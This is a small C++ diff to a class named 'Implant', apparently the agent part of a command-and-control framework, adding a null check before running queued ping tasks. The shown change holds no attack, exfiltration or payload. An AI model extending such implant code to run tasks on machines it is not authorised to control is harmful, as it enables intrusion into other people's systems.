@@ -53,6 +53,7 @@ void Implant::parse_tasks_response(const std::string &response)
 
 void Implant::run_all() {
     for (auto& task: tasks) {
+        if (!task.get()) continue;
         if (PingTask* ping_task = dynamic_cast<PingTask*>(task.get()))
             ping_task->run();
     }
